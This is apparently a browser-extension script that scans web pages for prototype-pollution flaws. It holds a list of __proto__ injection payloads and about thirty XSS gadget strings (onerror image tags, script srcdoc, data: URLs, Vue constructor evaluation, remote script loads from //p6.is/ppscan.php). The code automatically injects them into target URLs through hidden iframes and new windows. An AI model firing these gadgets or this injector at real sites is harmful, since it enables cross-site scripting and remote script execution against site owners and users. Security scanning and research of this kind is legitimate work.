var PAYLOADS = [
    // ['XSS Prototype #1',  'x[__proto__][e32a5ec9c99]', 'ddcb362f1d60', ],
    // ['XSS Prototype #2',  'x.__proto__.e32a5ec9c99','ddcb362f1d60', ],
    ['XSS Prototype #3', '__proto__[e32a5ec9c99]', 'ddcb362f1d60', ],
    ['XSS Prototype #4', '__proto__.e32a5ec9c99', 'ddcb362f1d60', ],
    // ['XSS Prototype #5',   '__proto__','{\"e32a5ec9c99\":\"e32a5ec9c99\"}'],
    // ['XSS Prototype #6',   '__proto__','{\"__proto__\":{\"e32a5ec9c99\":\"e32a5ec9c99\"}}']
];

var GADGETS = [
    '__proto__[innerHTML]=<img/src/onerror=ppscan()>',
    '__proto__[context]=<img/src/onerror%3dppscan()>&__proto__[jquery]=x',
    '__proto__[url][]=data:,ppscan()//&__proto__[dataType]=script',
    '__proto__[url]=data:,ppscan()//&__proto__[dataType]=script&__proto__[crossDomain]=',
    '__proto__[src][]=data:,ppscan()//',
    '__proto__[url]=data:,ppscan()//',
    '__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%3dppscan()>&__proto__[div][2]=1',
    '__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dppscan()>',
    '__proto__[srcdoc][]=<script>ppscan()</script>',
    '__proto__[hif][]=javascript:ppscan()',
    '__proto__[attrs][src]=1&__proto__[src]=//p6.is/ppscan.php',
    '__proto__[BOOMR]=1&__proto__[url]=//p6.is/ppscan.php',
    '__proto__[sourceURL]=%E2%80%A8%E2%80%A9ppscan()',
    '__proto__[innerText]=<script>ppscan()</script>',
    '__proto__[CLOSURE_BASE_PATH]=data:,ppscan()//',
    '__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=ppscan()',
    '__proto__[src]=data:,ppscan()//',
    '__proto__[xxx]=ppscan()',
    '__proto__[onload]=ppscan()',
    '__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%3dppscan()>&__proto__[script][2]=1',
    "__proto__[4]=a':1,[ppscan()]:1,'b&__proto__[5]=,",
    '__proto__[onerror]=ppscan()',
    '__proto__[div][intro]=<img%20src%20onerror%3dppscan()>',
    "__proto__[v-if]=_c.constructor('ppscan()')()",
    '__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,ppscan()//&__proto__[is]=script',
    "__proto__[v-bind:class]=''.constructor.constructor('ppscan()')()",
    '__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>ppscan()</script>',
    `__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('ppscan()')(),"`,
    '__proto__[template]=<script>ppscan()</script>',
    '__proto__[srcdoc]=<script>ppscan()</script>',
    '__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//p6.is/ppscan.php',
];

window.addEventListener('message', function(event) {
    if (event.data.url && event.data.foo == "baz") {
        if (window.name.search("ppdeadbeef1") == -1) { // avoiding recurssion
            var url = event.data.url;
            for (let idx in GADGETS) {
                if (event.data.type != 'hash') {
                    setTimeout(() => {
                        let iframe = document.createElement("iframe");
                        let target_url = new URL(url);

                        target_url.search = GADGETS[idx];
                        iframe.name = "ppdeadbeef1"
                        iframe.src = target_url;
                        console.log(`[search:${idx}] `, target_url.href);
                        document.documentElement.appendChild(iframe);
                    }, 500 * idx);
                } else {
                    setTimeout(() => {
                        let iframe = document.createElement("iframe");
                        let target_url = new URL(url);

                        target_url.hash = GADGETS[idx];
                        iframe.name = "ppdeadbeef1"
                        iframe.src = target_url;
                        console.log(`[hash:${idx}] `, target_url.href);
                        document.documentElement.appendChild(iframe);
                    }, 500 * idx);
                }
            }
        }
    } else if (event.data.url && event.data.foo == "bar") {
        chrome.storage.sync.get("buster", function(data) {
            if (data.buster) {
                var url = event.data.url;
                console.log(url)
                if (url.search("dummy") == -1 && window.name.search("ppdeadbeef1") == -1) { // avooiding recursion
                    var locasdf = new URL(url);
                    locasdf.searchParams.append('dummy', 'dummy') // avoiding recursion(twitter removes window.name)
                    locasdf.hash = "#dummy"
                    var a = window.open(locasdf.href, "ppdeadbeef1win");
                    // a.blur();

                }
            } else {
                if (window.name.search("ppdeadbeef1") == -1) { // avoiding recurssion
                    var url = event.data.url;
                    for (i = 0; i < PAYLOADS.length; i++) {
                        for (j = 0; j < 2; j++) {
                            var locasdf = new URL(url);

                            // debugger;
                            var iframe = document.createElement("iframe");
                            j ? locasdf.searchParams.append(PAYLOADS[i][1], PAYLOADS[i][2]) : locasdf.hash = "#" + PAYLOADS[i][1] + "=" + PAYLOADS[i][2];
                            iframe.name = "ppdeadbeef1"
                            console.log(decodeURI(locasdf.href));
                            iframe.src = decodeURI(locasdf.href);
                            // iframe.sandbox="allow-forms allow-scripts allow-same-origin"
                            document.documentElement.appendChild(iframe);
                        }
                    }
                }
            }
        });
    }
});